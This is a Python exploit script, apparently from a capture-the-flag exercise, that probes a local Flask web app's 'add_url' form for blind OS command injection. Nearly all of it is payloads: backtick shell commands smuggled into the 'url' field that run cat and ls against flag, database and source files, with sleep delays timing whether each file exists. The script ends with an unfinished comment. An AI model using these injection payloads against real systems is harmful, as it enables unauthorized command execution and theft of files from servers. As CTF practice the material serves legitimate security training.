import requests
import time

BASE_URL = "http://127.0.0.1:32998/add_url"
headers = {"Content-Type": "application/x-www-form-urlencoded"}

def test_payload(payload, description):
    """Test a payload with timing"""
    data = f"url={payload}"
    start = time.time()
    try:
        resp = requests.post(BASE_URL, headers=headers, data=data, timeout=10)
        elapsed = time.time() - start
        return elapsed, resp.status_code, resp.text[:200]
    except Exception as e:
        return 0, "ERROR", str(e)

print("[+] Trying alternative file discovery methods...\n")

# Test 1: Try cat with different delays for success/failure
print("="*60)
print("[METHOD 1] File read attempt with success/failure differential timing")
print("="*60)

read_tests = [
    # If file exists, cat succeeds and we sleep; if fails, no sleep
    ("`cat flag.txt 2>/dev/null && sleep 1.5 || sleep 0`", "flag.txt"),
    ("`cat /app/flag.txt 2>/dev/null && sleep 1.5 || sleep 0`", "/app/flag.txt"),
    ("`cat /flag.txt 2>/dev/null && sleep 1.5 || sleep 0`", "/flag.txt"),
    ("`cat flag 2>/dev/null && sleep 1.5 || sleep 0`", "flag"),
    ("`cat /tmp/flag.txt 2>/dev/null && sleep 1.5 || sleep 0`", "/tmp/flag.txt"),
    ("`cat ../flag.txt 2>/dev/null && sleep 1.5 || sleep 0`", "../flag.txt"),
    ("`cat /home/user/flag.txt 2>/dev/null && sleep 1.5 || sleep 0`", "/home/user/flag.txt"),
]

for payload, desc in read_tests:
    elapsed, status, text = test_payload(payload, desc)
    print(f"\n[TEST] {desc}")
    print(f"  Time: {elapsed:.3f}s")
    if elapsed >= 1.2:
        print(f"  [!] FILE EXISTS AT {desc}!")

# Test 2: Use more aggressive timeout to find variations
print("\n" + "="*60)
print("[METHOD 2] Wildcard search with ANY flag pattern")
print("="*60)

wildcard_paths = [
    # Search any file starting with flag
    "`ls -d flag* 2>/dev/null | head -1 | grep -q . && sleep 1.5`",
    "`ls -d /app/flag* 2>/dev/null | head -1 | grep -q . && sleep 1.5`",
    "`ls -d /tmp/flag* 2>/dev/null | head -1 | grep -q . && sleep 1.5`",
    "`ls -d *flag* 2>/dev/null | head -1 | grep -q . && sleep 1.5`",
    # Hidden files
    "`ls -d .flag* 2>/dev/null | head -1 | grep -q . && sleep 1.5`",
    "`ls -da .flag* 2>/dev/null | head -1 | grep -q . && sleep 1.5`",
]

for payload in wildcard_paths:
    elapsed, status, text = test_payload(payload, "wildcard")
    print(f"\n[WC TEST] Time: {elapsed:.3f}s")
    if elapsed >= 1.2:
        print(f"  [!] FILES FOUND!")

# Test 3: Try to understand file system structure
print("\n" + "="*60)
print("[METHOD 3] Reading directory listing to understand structure")
print("="*60)

# Let's try the server logic - maybe it uses a database
# Let's try Python's SQLite or normal file operations
sqlite_tests = [
    "`ls *.db 2>/dev/null && sleep 1`",
    "`ls *.sqlite 2>/dev/null && sleep 1`",
    "`ls *.sqlite3 2>/dev/null && sleep 1`",
    "`ls database/* 2>/dev/null && sleep 1`",
    "`ls data/* 2>/dev/null && sleep 1`",
]

for payload in sqlite_tests:
    elapsed, status, text = test_payload(payload, "sqlite")
    print(f"  DB Test - Time: {elapsed:.3f}s")

# Test 4: Try Python file on the server (it's a Flask app)
print("\n" + "="*60)
print("[METHOD 4] Finding application source files")
print("="*60)

python_files = [
    "`ls *.py 2>/dev/null | head -1 | grep -q py && sleep 1`",
    "`ls app.py 2>/dev/null && sleep 1`",
    "`ls main.py 2>/dev/null && sleep 1`",
    "`ls /app/*.py 2>/dev/null | head -1 | grep -q py && sleep 1`",
    "`ls /app/app.py 2>/dev/null && sleep 1`",
]

for payload in python_files:
    elapsed, status, text = test_payload(payload, "python")
    print(f"  Py Test - Time: {elapsed:.3f}s")
    if elapsed >= 1:
        print(f"    [!] PYTHON FILES FOUND!")

# Test 5: Try very commonly used patterns
print("\n" + "="*60)
print("[METHOD 5] Common CTF flag pattern testing")
print("="*60)

ctf_patterns = [
    # Common variations
    ("`cat flag.txt 2>/dev/null; echo $? | grep -q ^0 && sleep 1`", "flag.txt success code"),
    ("`cat flag 2>/dev/null; echo $? | grep -q ^0 && sleep 1`", "flag success code"),
    ("`cat FLAG.txt 2>/dev/null; echo $? | grep -q ^0 && sleep 1`", "FLAG.txt success code"),
    ("`cat flags.txt 2>/dev/null; echo $? | grep -q ^0 && sleep 1`", "flags.txt success code"),
    ("`cat flag.php 2>/dev/null; echo $? | grep -q ^0 && sleep 1`", "flag.php success code"),
    # Try explicit paths
    ("`cat ./flag.txt 2>/dev/null; echo $? | grep -q ^0 && sleep 1`", "./flag.txt"),
    ("`cat /var/flag.txt 2>/dev/null; echo $? | grep -q ^0 && sleep 1`", "/var/flag.txt"),
    ("`cat /root/flag.txt 2>/dev/null; echo $? | grep -q ^0 && sleep 1`", "/root/flag.txt"),
]

for payload, desc in ctf_patterns:
    elapsed, status, text = test_payload(payload, desc)
    print(f"\n[CTF] {desc}")
    print(f"  Time: {elapsed:.3f}s")
    if elapsed >= 1:
        print(f"  [!] FOUND AT: {desc}")

print("\n" + "="*60)
print("Trying one more approach - direct cat timing analysis...")
print("="*60)

# Try timing differences based on file existence
